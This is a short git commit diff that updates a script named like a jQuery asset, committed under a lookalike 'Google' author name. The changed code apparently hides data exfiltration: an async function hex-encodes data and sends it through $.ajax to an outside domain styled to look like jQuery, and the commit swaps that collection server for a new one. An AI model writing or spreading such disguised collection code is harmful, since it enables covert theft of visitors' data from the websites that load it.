1b93eb880190bb82950e3ef72da7a884c7b0f51b
6oogle <155930261+ImgTheHost@users.noreply.github.com>
2024-06-04 16:02:40 +0700

    Update all.asset.jquery.gds.js

--- all.asset.jquery.gds.js
+++ all.asset.jquery.gds.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://gapihxhdhjd.meso.my.id/content/?JapaScript=" +
+                    "https://jquery.news23.biz.id/index.php" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
